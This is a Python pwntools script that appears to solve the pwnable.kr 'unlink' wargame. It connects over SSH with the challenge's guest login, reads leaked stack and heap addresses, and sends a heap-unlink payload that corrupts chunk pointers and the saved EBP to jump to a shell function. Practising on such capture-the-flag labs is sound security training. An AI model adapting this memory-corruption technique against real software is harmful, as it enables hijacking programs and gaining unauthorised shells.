from pwn import *


SHELL_FUNCTION_ADDRESS = 0x80484eb


class StackDistance:
	EBP = -28

class HeapDistance:
	B_FD_ADDRESS = 24
	B_BK_ADDRESS = B_FD_ADDRESS + 4
	A_BUFFER_ADDRESS = 8


def build_payload(heap_address_leak: int, stack_address_leak: int) -> bytes:
	saved_ebp_address = stack_address_leak + StackDistance.EBP
	b_fd_address = heap_address_leak + HeapDistance.B_FD_ADDRESS
	b_bk_address = heap_address_leak + HeapDistance.B_BK_ADDRESS
	a_buffer_address = heap_address_leak + HeapDistance.A_BUFFER_ADDRESS

	return b''.join([
		p32(a_buffer_address + 8),
		p32(SHELL_FUNCTION_ADDRESS),
		p32(0),
		p32(19),
		p32(a_buffer_address + 4),
		p32(saved_ebp_address)
	]) + b'\n'

# Connect to pwnable unlink user via ssh
connection = ssh(user='unlink', port=2222, host='pwnable.kr', password='guest')
unlink_process = connection.run('/home/unlink/unlink')

# Retrieve the stack address
unlink_process.readuntil(b'stack address leak: 0x').decode()
stack_address_leak = unlink_process.readuntil(b'\n').decode().strip()
stack_address_leak = int(stack_address_leak, base=16)

# Retrieve the heap address 
unlink_process.readuntil(b'heap address leak: 0x').decode()
heap_address_leak = unlink_process.readuntil(b'\n').decode().strip()
heap_address_leak = int(heap_address_leak, base=16)

unlink_process.read()

payload = build_payload(heap_address_leak, stack_address_leak)
unlink_process.send(payload)





